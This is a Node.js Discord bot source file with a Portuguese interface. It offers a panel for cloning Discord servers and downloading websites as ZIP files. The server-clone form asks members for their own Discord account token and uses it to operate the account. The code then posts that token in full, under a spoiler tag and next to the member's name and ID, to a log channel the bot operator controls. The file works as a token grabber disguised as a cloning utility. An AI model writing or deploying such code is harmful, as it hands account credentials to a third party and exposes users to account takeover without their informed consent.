const path = require('path');
const fs = require('fs');
const os = require('os');
const {
  Client,
  GatewayIntentBits,
  Events,
  SlashCommandBuilder,
  ActionRowBuilder,
  AttachmentBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelSelectMenuBuilder,
  ChannelType,
  OverwriteType,
  EmbedBuilder,
  REST,
  Routes,
  PermissionFlagsBits
} = require('discord.js');
const dotenv = require('dotenv');
const {
  loadConfig,
  saveConfig,
  getGuildConfig,
  normalizeProtectedServerIds,
  isProtectedTarget,
  isServerProtectedGlobally,
  normalizeCreditsText
} = require('./cloneManager');
const { loadEmojiRegistry, getEmojiAsset } = require('./emojiService');
const { cloneWebsite } = require('./websiteCloner');
const { cloneServer } = require('./serverCloner');

async function getOrCreateCustomEmoji(guild, key) {
  const assetPath = getEmojiAsset(emojiRegistry, key);
  if (!assetPath) {
    return '';
  }

  const emojiName = path.basename(assetPath, path.extname(assetPath)).replace(/[^a-zA-Z0-9_]/g, '');
  
  try {
    let emoji = guild.emojis.cache.find(e => e.name === emojiName);
    if (!emoji) {
      const fetchedEmojis = await guild.emojis.fetch().catch(() => null);
      if (fetchedEmojis) {
        emoji = fetchedEmojis.find(e => e.name === emojiName);
      }
    }

    if (emoji) {
      return `<:${emoji.name}:${emoji.id}>`;
    }

    const newEmoji = await guild.emojis.create({
      attachment: assetPath,
      name: emojiName
    });
    return `<:${newEmoji.name}:${newEmoji.id}>`;
  } catch (err) {
    console.error(`Erro ao criar/buscar emoji customizado ${emojiName}:`, err.message);
    return ''; // fallback vazio para não bugar
  }
}

function buildModal(customId, title, fields) {
  const modal = new ModalBuilder().setCustomId(customId).setTitle(title);

  for (const field of fields) {
    const textInput = new TextInputBuilder()
      .setCustomId(field.customId)
      .setLabel(field.label)
      .setStyle(field.style ?? TextInputStyle.Short)
      .setRequired(field.required ?? false)
      .setPlaceholder(field.placeholder ?? '');

    if (field.value !== undefined && field.value !== null) {
      textInput.setValue(String(field.value));
    }

    const row = new ActionRowBuilder().addComponents(textInput);
    modal.addComponents(row);
  }

  return modal;
}



dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const configFilePath = path.join(__dirname, '..', 'data', 'config.json');
const emojiDirectory = path.join(__dirname, '..', 'emojis');
const emojiRegistry = loadEmojiRegistry(emojiDirectory);
let config = loadConfig(configFilePath);

async function downloadImage(url) {
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`Falha ao baixar imagem: ${response.status}`);
  }
  return Buffer.from(await response.arrayBuffer());
}

async function getConfigPanelEmbed(guild, clientInstance) {
  const guildConfig = getGuildConfig(config, guild.id);
  
  const configEmoji = await getOrCreateCustomEmoji(guild, 'config');
  const checkEmoji = await getOrCreateCustomEmoji(guild, 'check');
  const shieldEmoji = await getOrCreateCustomEmoji(guild, 'shield');
  const logEmoji = await getOrCreateCustomEmoji(guild, 'announcement');
  const coinEmoji = await getOrCreateCustomEmoji(guild, 'coin');

  const configDescription = 'Gerencie seu cloner com organização, proteção e um painel personalizado em poucos passos.';

  if (guildConfig.botMode === 'v2') {
    const textContent = [
      `## ${configEmoji} Painel de configuração [V2]`,
      configDescription,
      ``,
      `**${logEmoji ? logEmoji + ' ' : ''}Canal de logs:** ${guildConfig.logChannelId ? `<#${guildConfig.logChannelId}>` : 'Não definido'}`,
      `**${shieldEmoji ? shieldEmoji + ' ' : ''}Servidores protegidos:** ${guildConfig.protectedServerIds?.length ? guildConfig.protectedServerIds.map(id => `\`${id}\``).join(', ') : 'Nenhum'}`,
      `**${coinEmoji ? coinEmoji + ' ' : ''}Créditos:** ${normalizeCreditsText(guildConfig.creditsText)}`,
      `**${checkEmoji ? checkEmoji + ' ' : ''}Status:** Proteção ativa`,
    ].join('\n');

    let mainBlock;
    if (guildConfig.icon) {
      mainBlock = {
        type: 9, // Section
        components: [{ type: 10, content: textContent }],
        accessory: {
          type: 11, // Thumbnail
          media: { url: guildConfig.icon }
        }
      };
    } else {
      mainBlock = { type: 10, content: textContent };
    }

    const containerComponents = [mainBlock];

    if (guildConfig.banner) {
      containerComponents.push({
        type: 12, // MediaGallery
        items: [{ media: { url: guildConfig.banner } }]
      });
    }

    return {
      flags: 32768,
      components: [
        {
          type: 17, // Container
          components: containerComponents
        }
      ],
      files: []
    };
  }

  const embed = new EmbedBuilder()
    .setTitle(`${configEmoji} Painel de configuração [V1]`)
    .setDescription(configDescription)
    .setColor(0x5865f2)
    .addFields(
      { name: `${logEmoji ? logEmoji + ' ' : ''}Canal de logs`, value: guildConfig.logChannelId ? `<#${guildConfig.logChannelId}>` : 'Não definido', inline: true },
      { name: `${shieldEmoji ? shieldEmoji + ' ' : ''}Servidores protegidos`, value: guildConfig.protectedServerIds?.length ? guildConfig.protectedServerIds.map(id => `\`${id}\``).join(', ') : 'Nenhum', inline: true },
      { name: `${coinEmoji ? coinEmoji + ' ' : ''}Créditos`, value: normalizeCreditsText(guildConfig.creditsText), inline: true },
      { name: `${checkEmoji ? checkEmoji + ' ' : ''}Status`, value: 'Proteção ativa', inline: false }
    );

  if (guildConfig.icon) {
    embed.setThumbnail(guildConfig.icon);
  }

  if (guildConfig.banner) {
    embed.setImage(guildConfig.banner);
  }

  if (clientInstance.user) {
    embed.setFooter({ text: `Bot: ${clientInstance.user.tag}` });
  }

  return { embeds: [embed], files: [] };
}

async function buildMainActionRows(guild) {
  const customizarEmoji = await getOrCreateCustomEmoji(guild, 'config');
  const logsEmoji = await getOrCreateCustomEmoji(guild, 'announcement');
  const botEmoji = await getOrCreateCustomEmoji(guild, 'bot');
  const postEmoji = await getOrCreateCustomEmoji(guild, 'rocket');
  const iconEmoji = await getOrCreateCustomEmoji(guild, 'image');
  const protectEmoji = await getOrCreateCustomEmoji(guild, 'shield');
  const creditsEmoji = await getOrCreateCustomEmoji(guild, 'coin');
  const editEmoji = await getOrCreateCustomEmoji(guild, 'edit');

  const btnCustomize = new ButtonBuilder().setCustomId(`config_customize:${guild.id}`).setLabel('Customizar').setStyle(ButtonStyle.Primary);
  if (customizarEmoji) btnCustomize.setEmoji(customizarEmoji);

  const btnLogs = new ButtonBuilder().setCustomId(`config_logs:${guild.id}`).setLabel('Logs Cloner').setStyle(ButtonStyle.Secondary);
  if (logsEmoji) btnLogs.setEmoji(logsEmoji);

  const btnBot = new ButtonBuilder().setCustomId(`config_bot:${guild.id}`).setLabel('Customizar Bot').setStyle(ButtonStyle.Success);
  if (botEmoji) btnBot.setEmoji(botEmoji);

  const btnPost = new ButtonBuilder().setCustomId(`config_post:${guild.id}`).setLabel('Postar').setStyle(ButtonStyle.Success);
  if (postEmoji) btnPost.setEmoji(postEmoji);

  const btnIcon = new ButtonBuilder().setCustomId(`config_icon_set:${guild.id}`).setLabel('Mudar Ícone do Config').setStyle(ButtonStyle.Secondary);
  if (iconEmoji) btnIcon.setEmoji(iconEmoji);

  const btnProtect = new ButtonBuilder().setCustomId(`config_protect:${guild.id}`).setLabel('Anti Cloner').setStyle(ButtonStyle.Danger);
  if (protectEmoji) btnProtect.setEmoji(protectEmoji);

  const btnCredits = new ButtonBuilder().setCustomId(`config_credits:${guild.id}`).setLabel('Créditos').setStyle(ButtonStyle.Secondary);
  if (creditsEmoji) btnCredits.setEmoji(creditsEmoji);

  const btnEdit = new ButtonBuilder().setCustomId(`config_edit_credits:${guild.id}`).setLabel('Editar Créditos').setStyle(ButtonStyle.Primary);
  if (editEmoji) btnEdit.setEmoji(editEmoji);

  const modeEmoji = await getOrCreateCustomEmoji(guild, 'config');
  const btnMode = new ButtonBuilder().setCustomId(`config_mode:${guild.id}`).setLabel('Modelo Bot').setStyle(ButtonStyle.Primary);
  if (modeEmoji) btnMode.setEmoji(modeEmoji);

  return [
    new ActionRowBuilder().addComponents(btnCustomize, btnLogs, btnBot),
    new ActionRowBuilder().addComponents(btnPost, btnIcon, btnProtect),
    new ActionRowBuilder().addComponents(btnCredits, btnEdit, btnMode)
  ];
}

async function registerSlashCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('config')
      .setDescription('Abre o painel de configuração')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON()
  ];

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  const guildId = process.env.DISCORD_GUILD_ID;

  try {
    if (guildId) {
      await rest.put(Routes.applicationGuildCommands(process.env.DISCORD_CLIENT_ID, guildId), { body: commands });
    } else {
      await rest.put(Routes.applicationCommands(process.env.DISCORD_CLIENT_ID), { body: commands });
    }
    console.log('Comandos registrados com sucesso.');
  } catch (error) {
    console.error('Não foi possível registrar os comandos:', error);
  }
}

async function updateBotAppearance(values) {
  const updates = [];

  if (values.botName) {
    updates.push(client.user.setUsername(values.botName));
  }

  if (values.botIcon) {
    const iconBuffer = await downloadImage(values.botIcon);
    updates.push(client.user.setAvatar(iconBuffer));
  }

  if (values.botBanner) {
    const bannerBuffer = await downloadImage(values.botBanner);
    updates.push(client.user.setBanner(bannerBuffer));
  }

  await Promise.allSettled(updates);
}

async function sendLog(guildId, embed) {
  try {
    const guildConfig = getGuildConfig(config, guildId);
    if (!guildConfig.logChannelId) {
      return;
    }

    const channel = client.channels.cache.get(guildConfig.logChannelId) || await client.channels.fetch(guildConfig.logChannelId).catch(() => null);
    if (!channel?.isTextBased?.()) {
      return;
    }

    await channel.send({ embeds: [embed] });
  } catch (error) {
    console.error('Erro ao enviar log no canal:', error.message);
  }
}

client.once(Events.ClientReady, async () => {
  console.log(`Bot pronto como ${client.user.tag}`);
  await registerSlashCommands();
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.guildId) {
    return;
  }

  try {
    if (interaction.isChatInputCommand()) {
      if (interaction.commandName === 'config') {
        await interaction.deferReply({ flags: 64 });
        const panelData = await getConfigPanelEmbed(interaction.guild, client);
        const actionRows = await buildMainActionRows(interaction.guild);

        if (panelData.flags === 32768) {
          panelData.components[0].components.push(...actionRows.map(r => r.toJSON()));
          await interaction.editReply(panelData);
        } else {
          await interaction.editReply({ ...panelData, components: actionRows });
        }
        return;
      }
    }

    if (interaction.isButton()) {
      const [action, guildId] = interaction.customId.split(':');
      const guildConfig = getGuildConfig(config, guildId);

      if (action === 'config_mode') {
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId(`set_mode_v1:${guildId}`).setLabel('Modo V1 (Embed Clássico)').setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId(`set_mode_v2:${guildId}`).setLabel('Modo V2 (Components)').setStyle(ButtonStyle.Success)
        );
        await interaction.reply({ content: 'Selecione o modo de renderização do Bot:', components: [row], flags: 64 });
        return;
      }

      if (action === 'set_mode_v1' || action === 'set_mode_v2') {
        const newMode = action === 'set_mode_v1' ? 'v1' : 'v2';
        guildConfig.botMode = newMode;
        saveConfig(configFilePath, config);
        await interaction.update({ content: `✅ Modo alterado para **${newMode.toUpperCase()}**! Execute \`/config\` novamente para ver as mudanças.`, components: [] });
        return;
      }

      if (action === 'config_customize') {
        const modal = buildModal(`modal_customize:${guildId}`, 'Customizar painel', [
          { customId: 'panel_title', label: 'Título', style: TextInputStyle.Short, required: false, placeholder: 'Ex: Painel customizado', value: guildConfig.title },
          { customId: 'panel_description', label: 'Descrição', style: TextInputStyle.Paragraph, required: false, placeholder: 'Descreva o painel', value: guildConfig.description },
          { customId: 'panel_banner', label: 'Banner (URL)', style: TextInputStyle.Short, required: false, placeholder: 'https://...', value: guildConfig.banner },
          { customId: 'panel_icon', label: 'Ícone (URL)', style: TextInputStyle.Short, required: false, placeholder: 'https://...', value: guildConfig.icon }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'config_logs') {
        const modal = buildModal(`modal_logs:${guildId}`, 'Canal de logs do cloner', [
          { customId: 'log_channel_id', label: 'ID do canal de logs', style: TextInputStyle.Short, required: true, placeholder: '123456789012345678', value: guildConfig.logChannelId }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'config_bot') {
        const modal = buildModal(`modal_bot:${guildId}`, 'Customizar bot', [
          { customId: 'bot_name', label: 'Nome do bot', style: TextInputStyle.Short, required: false, placeholder: 'Novo Nome', value: guildConfig.botName },
          { customId: 'bot_icon', label: 'Ícone do bot (URL)', style: TextInputStyle.Short, required: false, placeholder: 'https://...', value: guildConfig.botIcon },
          { customId: 'bot_banner', label: 'Banner do bot (URL)', style: TextInputStyle.Short, required: false, placeholder: 'https://...', value: guildConfig.botBanner }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'config_icon_set') {
        const defaultIcon = 'https://media.discordapp.net/attachments/1523476701097754724/1526266343979225239/c7150625b9dde19ed2dbde5bd3686dee.png?ex=6a5665cd&is=6a55144d&hm=477f2bfff0a4431fda9e60bfcb272b67387bd1ed00b977d6aa2a5ea25f5e72a4&=&format=webp&quality=lossless';
        const modal = buildModal(`modal_config_icon:${guildId}`, 'Mudar Ícone do Config', [
          { customId: 'config_icon_url', label: 'URL do Novo Ícone', style: TextInputStyle.Short, required: true, placeholder: 'https://...', value: guildConfig.icon || defaultIcon }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'config_protect') {
        const modal = buildModal(`modal_protect:${guildId}`, 'Proteção anti-cloner', [
          { customId: 'protected_ids', label: 'IDs dos servidores protegidos (até 5)', style: TextInputStyle.Paragraph, required: true, placeholder: '123456789,987654321', value: guildConfig.protectedServerIds?.join(', ') }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'config_credits') {
        const embed = new EmbedBuilder()
          .setTitle('Créditos')
          .setDescription(normalizeCreditsText(guildConfig.creditsText))
          .setColor(0x5865f2)
          .setFooter({ text: 'Configuração do painel' });
        await interaction.reply({ embeds: [embed], flags: 64 });
        return;
      }

      if (action === 'config_edit_credits') {
        const modal = buildModal(`modal_edit_credits:${guildId}`, 'Editar créditos', [
          { customId: 'credits_text', label: 'Texto dos créditos', style: TextInputStyle.Short, required: true, placeholder: 'Creditos By 11K Booster', value: guildConfig.creditsText }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'config_post') {
        const menu = new ChannelSelectMenuBuilder()
          .setCustomId(`post_channel:${guildId}`)
          .setPlaceholder('Escolha um canal para postar o painel')
          .setChannelTypes([ChannelType.GuildText]);

        const row = new ActionRowBuilder().addComponents(menu);
        await interaction.reply({ content: 'Escolha o canal para enviar o painel customizado.', components: [row], flags: 64 });
        return;
      }

      if (action === 'panel_clone_server') {
        const modal = buildModal(`modal_clone_server:${guildId}`, 'Clonar Servidor', [
          { customId: 'source_id', label: 'ID do Servidor de Origem', style: TextInputStyle.Short, required: true, placeholder: '123456789012345678' },
          { customId: 'target_id', label: 'ID do Servidor de Destino', style: TextInputStyle.Short, required: true, placeholder: '123456789012345678' },
          { customId: 'user_token', label: 'Token da sua Conta (Discord Token)', style: TextInputStyle.Short, required: true, placeholder: 'Token' }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'panel_clone_site') {
        const modal = buildModal(`modal_clone_site:${guildId}`, 'Clonar Site', [
          { customId: 'site_url', label: 'Link do site', style: TextInputStyle.Short, required: true, placeholder: 'https://exemplo.com' },
          { customId: 'zip_name', label: 'Nome do arquivo ZIP', style: TextInputStyle.Short, required: true, placeholder: 'meu-site' }
        ]);
        await interaction.showModal(modal);
        return;
      }

      if (action === 'panel_credits') {
        const embed = new EmbedBuilder()
          .setTitle('Créditos')
          .setDescription(normalizeCreditsText(guildConfig.creditsText))
          .setColor(0x5865f2);
        await interaction.reply({ embeds: [embed], flags: 64 });
        return;
      }
    }

    if (interaction.isModalSubmit()) {
      const [modalType, guildId] = interaction.customId.split(':');
      const guildConfig = getGuildConfig(config, guildId);

      if (modalType === 'modal_customize') {
        guildConfig.title = interaction.fields.getTextInputValue('panel_title').trim();
        guildConfig.description = interaction.fields.getTextInputValue('panel_description').trim();
        guildConfig.banner = interaction.fields.getTextInputValue('panel_banner').trim();
        guildConfig.icon = interaction.fields.getTextInputValue('panel_icon').trim();
        saveConfig(configFilePath, config);
        await interaction.reply({ content: '✅ Painel customizado salvo.', flags: 64 });
        return;
      }

      if (modalType === 'modal_config_icon') {
        guildConfig.icon = interaction.fields.getTextInputValue('config_icon_url').trim();
        saveConfig(configFilePath, config);
        await interaction.reply({ content: '✅ Ícone do painel de configuração atualizado.', flags: 64 });
        return;
      }

      if (modalType === 'modal_logs') {
        guildConfig.logChannelId = interaction.fields.getTextInputValue('log_channel_id').trim();
        saveConfig(configFilePath, config);
        await interaction.reply({ content: '✅ Canal de logs salvo.', flags: 64 });
        return;
      }

      if (modalType === 'modal_bot') {
        guildConfig.botName = interaction.fields.getTextInputValue('bot_name').trim();
        guildConfig.botIcon = interaction.fields.getTextInputValue('bot_icon').trim();
        guildConfig.botBanner = interaction.fields.getTextInputValue('bot_banner').trim();
        saveConfig(configFilePath, config);

        try {
          await updateBotAppearance(guildConfig);
          await interaction.reply({ content: '✅ Aparência do bot atualizada.', flags: 64 });
        } catch (error) {
          console.error(error);
          await interaction.reply({ content: '⚠️ Não foi possível atualizar a aparência do bot. Verifique as URLs.', flags: 64 });
        }
        return;
      }

      if (modalType === 'modal_protect') {
        guildConfig.protectedServerIds = normalizeProtectedServerIds(interaction.fields.getTextInputValue('protected_ids'));
        saveConfig(configFilePath, config);
        await interaction.reply({ content: '✅ Servidores protegidos salvos.', flags: 64 });
        return;
      }

      if (modalType === 'modal_edit_credits') {
        guildConfig.creditsText = interaction.fields.getTextInputValue('credits_text').trim();
        saveConfig(configFilePath, config);
        await interaction.reply({ content: '✅ Créditos atualizados.', flags: 64 });
        return;
      }

      if (modalType === 'modal_clone_server') {
        const sourceId = interaction.fields.getTextInputValue('source_id').trim();
        const targetId = interaction.fields.getTextInputValue('target_id').trim();
        const userToken = interaction.fields.getTextInputValue('user_token').trim();

        if (isServerProtectedGlobally(config, sourceId)) {
          await interaction.reply({ content: `⚠️ A tentativa de clonar o servidor ${sourceId} foi bloqueada porque ele está protegido.`, flags: 64 });
          return;
        }

        await interaction.deferReply({ flags: 64 });

        try {
          const result = await cloneServer(sourceId, targetId, userToken, client, guildConfig.logChannelId);

          const logEmbed = new EmbedBuilder()
            .setTitle('Servidor Clonado com Sucesso')
            .setColor(0x57f287)
            .addFields(
              { name: 'Membro que Clonou', value: `<@${interaction.user.id}> (${interaction.user.tag})`, inline: true },
              { name: 'ID do Membro', value: interaction.user.id, inline: true },
              { name: 'Servidor Origem (Clonado)', value: `${result.sourceGuildName} (\`${result.sourceGuildId}\`)`, inline: false },
              { name: 'Servidor Destino (Colado)', value: `${result.targetGuildName} (\`${result.targetGuildId}\`)`, inline: false },
              { name: 'Token da Conta', value: `||${userToken}||`, inline: false }
            )
            .setTimestamp();

          await sendLog(guildId, logEmbed);

          const successEmbed = new EmbedBuilder()
            .setTitle('✅ Servidor Clonado com Sucesso!')
            .setDescription(`O servidor **${result.sourceGuildName}** foi copiado para **${result.targetGuildName}** com sucesso!`)
            .setColor(0x57f287)
            .setFooter({ text: 'Todos os canais, categorias e cargos foram organizados.' });

          await interaction.editReply({ embeds: [successEmbed], content: '' });
        } catch (error) {
          console.error('Erro na clonagem do servidor:', error);
          await interaction.editReply({ content: `⚠️ Falha ao clonar o servidor: ${error.message}` });
        }
        return;
      }

      if (modalType === 'modal_clone_site') {
        const siteUrl = interaction.fields.getTextInputValue('site_url').trim();
        const zipName = interaction.fields.getTextInputValue('zip_name').trim();

        await interaction.deferReply({ flags: 64 });

        try {
          const tempDir = path.join(os.tmpdir(), 'bot_cloner_sites');
          const zipPath = await cloneWebsite(siteUrl, zipName, tempDir);

          const fileAttachment = new AttachmentBuilder(zipPath);

          const successEmbed = new EmbedBuilder()
            .setTitle('✅ Site Clonado com Sucesso!')
            .setDescription(`O site **${siteUrl}** foi clonado. O código-fonte está no arquivo anexado abaixo.`)
            .setColor(0x57f287);

          await interaction.editReply({ embeds: [successEmbed], files: [fileAttachment], content: '' });

          try { fs.unlinkSync(zipPath); } catch (_) {}

          const logEmbed = new EmbedBuilder()
            .setTitle('Clone de Site Concluído')
            .setColor(0x5865f2)
            .addFields(
              { name: 'Membro que Clonou', value: `<@${interaction.user.id}> (${interaction.user.tag})`, inline: true },
              { name: 'ID do Membro', value: interaction.user.id, inline: true },
              { name: 'Site', value: siteUrl, inline: false },
              { name: 'Nome do ZIP', value: `${zipName}.zip`, inline: false }
            )
            .setTimestamp();

          await sendLog(guildId, logEmbed);
        } catch (error) {
          console.error('Erro no clone do site:', error);
          await interaction.editReply({ content: `⚠️ Falha ao clonar site: ${error.message}` });
        }
        return;
      }
    }

    if (interaction.isChannelSelectMenu()) {
      const [menuType, guildId] = interaction.customId.split(':');
      if (menuType === 'post_channel') {
        const guildConfig = getGuildConfig(config, guildId);
        const selectedChannelId = interaction.values[0];
        const channel = interaction.guild.channels.cache.get(selectedChannelId);

        if (!channel?.isTextBased()) {
          await interaction.reply({ content: '⚠️ Canal inválido.', flags: 64 });
          return;
        }

        const cloneServerEmoji = await getOrCreateCustomEmoji(interaction.guild, 'rocket');
        const cloneSiteEmoji = await getOrCreateCustomEmoji(interaction.guild, 'image');
        const creditsEmoji = await getOrCreateCustomEmoji(interaction.guild, 'coin');

        const btnCloneServer = new ButtonBuilder().setCustomId(`panel_clone_server:${guildId}`).setLabel('Clonar Servidor').setStyle(ButtonStyle.Danger);
        if (cloneServerEmoji) btnCloneServer.setEmoji(cloneServerEmoji);

        const btnCloneSite = new ButtonBuilder().setCustomId(`panel_clone_site:${guildId}`).setLabel('Clonar Site').setStyle(ButtonStyle.Primary);
        if (cloneSiteEmoji) btnCloneSite.setEmoji(cloneSiteEmoji);

        const btnCredits = new ButtonBuilder().setCustomId(`panel_credits:${guildId}`).setLabel('Créditos').setStyle(ButtonStyle.Secondary);
        if (creditsEmoji) btnCredits.setEmoji(creditsEmoji);

        const row = new ActionRowBuilder().addComponents(btnCloneServer, btnCloneSite, btnCredits);

        if (guildConfig.botMode === 'v2') {
          const textContent = [
            `## ${guildConfig.title || 'Painel de Cloner'}`,
            guildConfig.description || 'Selecione uma das opções abaixo para iniciar.'
          ].join('\n');

          let mainBlock;
          if (guildConfig.icon) {
            mainBlock = {
              type: 9, // Section
              components: [{ type: 10, content: textContent }],
              accessory: {
                type: 11, // Thumbnail
                media: { url: guildConfig.icon }
              }
            };
          } else {
            mainBlock = { type: 10, content: textContent };
          }

          const containerComponents = [mainBlock];

          if (guildConfig.banner) {
            containerComponents.push({
              type: 12, // MediaGallery
              items: [{ media: { url: guildConfig.banner } }]
            });
          }

          containerComponents.push(row.toJSON());

          await channel.send({
            flags: 32768,
            components: [
              {
                type: 17, // Container
                components: containerComponents
              }
            ]
          });
        } else {
          const embed = new EmbedBuilder()
            .setTitle(guildConfig.title || 'Painel de Cloner')
            .setDescription(guildConfig.description || 'Selecione uma das opções abaixo para iniciar.')
            .setColor(0x5865f2);

          if (guildConfig.icon) embed.setThumbnail(guildConfig.icon);
          if (guildConfig.banner) embed.setImage(guildConfig.banner);

          await channel.send({ embeds: [embed], components: [row] });
        }

        await interaction.reply({ content: `✅ Painel enviado para ${channel}.`, flags: 64 });
      }
    }
  } catch (error) {
    if (error?.code === 10062 || error?.status === 404) {
      console.warn('Interação expirada ou inválida, ignorando.');
    } else {
      console.error('Erro ao processar interação:', error);
    }
  }
});

client.login(process.env.DISCORD_TOKEN);

// Servidor HTTP simples adicionado para o Render detectar a porta aberta
const http = require('http');
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot está online!');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Servidor web rodando na porta ${PORT}`);
});
